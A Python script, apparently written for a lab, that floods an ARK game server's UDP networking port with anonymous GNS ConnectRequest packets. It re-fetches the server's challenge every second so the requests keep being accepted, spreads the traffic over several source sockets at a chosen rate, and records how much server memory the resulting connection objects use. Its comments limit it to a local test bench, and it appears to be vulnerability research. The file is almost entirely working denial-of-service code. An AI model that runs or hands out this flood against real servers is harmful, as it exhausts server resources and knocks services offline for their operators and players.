# -*- coding: utf-8 -*-
"""
ark_lab_gns_conn_flood.py — измерение серверного состояния от N анонимных
GNS-ConnectRequest (без Steam-сертификата).

Установлено ранее:
  * сервер отвечает на ChallengeRequest (0x20) и выдаёт challenge;
  * challenge = SipHash(nTime, порт, IP)|nTime, nTime = usecNow>>20 (~1.05 с),
    сервер отклоняет challenge старше ~4.2 с ("Challenge too old"), поэтому
    его нужно перезапрашивать каждые ~1 с;
  * ConnectRequest (0x22) без cert принимается -> ConnectOK (0x23),
    создаётся объект соединения (~13 КБ) и запись в m_mapChildConnections;
  * после этого сервер отклоняет канал ("Crypto handshake missing cert or
    session data" -> end reason 5002) и закрывает соединение.

Измеряем: сколько соединений сервер держит одновременно, сколько памяти на
них уходит, с какой скоростью сервер переваривает пакеты.

Только локальный стенд 192.168.8.218.
"""
from __future__ import annotations

import argparse
import os
import socket
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ark_lab_metrics import NetGuardClient  # noqa: E402
from ark_lab_gns_connect import (  # noqa: E402
    MSG_CHALLENGE_REPLY, MSG_CONNECT_OK,
    challenge_request_frame, connect_request_frame, parse_pb,
)


def main() -> int:
    ap = argparse.ArgumentParser(description="Флуд анонимными GNS ConnectRequest")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--game-port", type=int, default=7778)
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--count", type=int, default=500)
    ap.add_argument("--sockets", type=int, default=1,
                    help="сколько исходящих портов использовать (1 = один адрес)")
    ap.add_argument("--id-mode", choices=("random", "time"), default="random",
                    help="как формировать client_connection_id")
    ap.add_argument("--rate", type=float, default=0.0, help="пакетов/с (0 = максимум)")
    ap.add_argument("--watch", type=float, default=15.0, help="сколько секунд наблюдать за памятью")
    args = ap.parse_args()

    m = NetGuardClient("127.0.0.1", args.metrics_port).connect()

    def st():
        return m.status()

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("0.0.0.0", 0))
    socks = [s]
    for _ in range(max(0, args.sockets - 1)):
        sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sk.bind(("0.0.0.0", 0))
        socks.append(sk)
    print("наши адреса: %s" % ", ".join("%s:%d" % sk.getsockname() for sk in socks))

    def get_challenge(sk) -> int:
        sk.settimeout(1.0)
        sk.sendto(challenge_request_frame(0x11223344, int(time.time() * 1000) & 0xFFFFFFFFFFFF),
                  (args.host, args.game_port))
        try:
            data, _ = sk.recvfrom(4096)
        except socket.timeout:
            return 0
        if data[0] != MSG_CHALLENGE_REPLY:
            return 0
        return (parse_pb(data[1:]).get(2) or [0])[0]

    b = st()
    print("до : memKB=%s tps=%s" % (b.get("memKB"), b.get("tps")))

    ok = closed = other = 0
    hist: dict[int, int] = {}
    sent = 0
    t0 = time.time()
    challenge = get_challenge(socks[0])
    challenge_at = time.time()
    interval = 1.0 / args.rate if args.rate > 0 else 0.0
    next_t = t0
    for sk in socks:
        sk.setblocking(False)
    next_sample = time.time()
    while sent < args.count:
        now = time.time()
        # примерно раз в 0.5 с снимаем метрики сервера во время флуда
        if now >= next_sample:
            a = st()
            print("  t=%5.1f с  отправлено=%d  memKB=%s (Δ %+d)  tps=%s" % (
                now - t0, sent, a.get("memKB"),
                (a.get("memKB") or 0) - (b.get("memKB") or 0), a.get("tps")))
            next_sample = now + 0.5
        # challenge протухает примерно за 4 с -> обновляем
        if now - challenge_at > 1.0:
            socks[0].setblocking(True)
            challenge = get_challenge(socks[0])
            challenge_at = time.time()
            socks[0].setblocking(False)
        if interval:
            if now < next_t:
                time.sleep(next_t - now)
            next_t += interval
        # раунд: по одному пакету с каждого сокета, затем один общий дренаж
        for sk in socks:
            if sent >= args.count:
                break
            if args.id_mode == "time":
                # "time-like" connection ID: младшие 16 бит = текущая единица времени GNS
                cc_id = (int(time.time() * 1000000) >> 20) & 0xFFFF
            else:
                cc_id = 0x20000000 + ((sent * 7919) & 0x7FFFFFFF)
            try:
                sk.sendto(connect_request_frame(cc_id, challenge, int(time.time() * 1000) & 0xFFFFFFFFFFFF),
                          (args.host, args.game_port))
            except OSError:
                pass
            sent += 1
        for sk2 in socks:
            while True:
                try:
                    r = sk2.recvfrom(4096)[0]
                except (BlockingIOError, OSError):
                    break
                if r[0] == MSG_CONNECT_OK:
                    ok += 1
                elif r[0] == 0x24:
                    closed += 1
                else:
                    other += 1
                hist[r[0]] = hist.get(r[0], 0) + 1
    dt = time.time() - t0
    # финальный дрейн
    for sk in socks:
        sk.settimeout(0.3)
        while True:
            try:
                r = sk.recvfrom(4096)[0]
            except socket.timeout:
                break
            if r[0] == MSG_CONNECT_OK:
                ok += 1
            elif r[0] == 0x24:
                closed += 1
            else:
                other += 1
            hist[r[0]] = hist.get(r[0], 0) + 1
    print("отправлено %d ConnectRequest за %.2f с (%.0f pps): ConnectOK=%d ConnectionClosed=%d прочее=%d"
          % (sent, dt, sent / dt if dt else 0, ok, closed, other))
    print("гистограмма ответов (lead byte -> count): %s" % hist)
    for sk in socks:
        sk.close()

    print("наблюдение %.0f с ..." % args.watch)
    t1 = time.time()
    while time.time() - t1 < args.watch:
        a = st()
        print("  t=%5.1f с  memKB=%s (Δ %+d)  tps=%s" % (
            time.time() - t1, a.get("memKB"),
            (a.get("memKB") or 0) - (b.get("memKB") or 0), a.get("tps")))
        time.sleep(2.0)

    a = st()
    d = (a.get("memKB") or 0) - (b.get("memKB") or 0)
    print("итог: Δ memKB = %+d (%.1f КБ на ConnectRequest)  tps %s -> %s" % (
        d, d / max(1, sent), b.get("tps"), a.get("tps")))
    s.close()
    m.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
